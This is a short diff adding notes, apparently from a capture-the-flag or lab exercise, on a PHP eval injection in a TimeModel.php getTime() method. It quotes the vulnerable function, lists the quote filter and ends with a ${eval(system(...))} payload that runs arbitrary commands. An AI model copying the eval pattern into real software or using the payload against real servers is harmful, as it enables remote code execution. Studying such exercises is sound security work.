@@ -1,0 +1,15 @@
+file have vunribalte -> TimeModel.php
+code  : -> 
+public function getTime()
+    {
+        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
+        return isset($time) ? $time : 'Something went terribly wrong';
+    }
+
+
+rules: -> 
+cant use '' or "" 
+use tag string ${}
+
+payload : -> 
+?parm=${eval(system($_GET[0]))}&0=dir
